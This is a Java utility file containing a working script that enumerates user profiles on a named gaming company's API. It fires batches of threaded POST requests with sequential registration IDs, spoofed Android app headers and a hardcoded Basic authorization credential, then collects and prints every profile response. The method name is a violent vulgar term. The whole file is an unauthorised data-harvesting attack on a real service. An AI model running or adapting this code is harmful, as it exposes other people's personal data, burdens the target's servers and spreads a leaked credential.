package in.meshworks.utils;

import okhttp3.*;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.atomic.AtomicReference;

/**
 * Created by dhruv.suri on 11/11/17.
 */
public class Extras {

    public static void main(String args[]) {
        rapeWinzo();
    }

    public static void rapeWinzo() {
        OkHttpClient client = new OkHttpClient();
        Map<Integer, String> map = new HashMap<>();
        int finalCount = 0;


        int batch = 0;

        while (batch < 200){
            int start = finalCount;
            int end = finalCount + 500;
            finalCount = end;

            while (start < end){
                final Integer count = start;
                new Thread() {
                    public void run() {
                        try {
                            Thread.sleep(new Random().nextInt(500));
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        MediaType mediaType = MediaType.parse("application/json");

                        RequestBody body = RequestBody.create(mediaType, "{\"REGISTRATIONID\": " + count + "}");
                        Request request = new Request.Builder()
                                .url("https://app.winzogames.com/User.svc/user_profile")
                                .post(body)
                                .addHeader("accept-encoding", "gzip")
                                .addHeader("app-version", "69")
                                .addHeader("authorization", "Basic V2luWm9HYW1lczp3SU56T2dBTUVT")
                                .addHeader("connection", "Keep-Alive")
                                .addHeader("content-length", "25")
                                .addHeader("content-type", "application/json")
                                .addHeader("host", "app.winzogames.com")
                                .addHeader("user-agent", "Dalvik/2.1.0 (Linux; U; Android 7.1.1; ONEPLUS A3003 Build/NMF26F)")
                                .addHeader("cache-control", "no-cache")
                                .build();

                        try {
                            Response response = client.newCall(request).execute();
                            synchronized (map){
                                String responseString = response.body().string();
                                map.put(count, responseString);
                                System.out.println(responseString);
                            }

                        } catch (IOException e) {
                        }
                    }
                }.start();
                start++;
            }
            try {
                Thread.sleep(20000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            batch++;
        }

        System.out.println(map);
    }

}

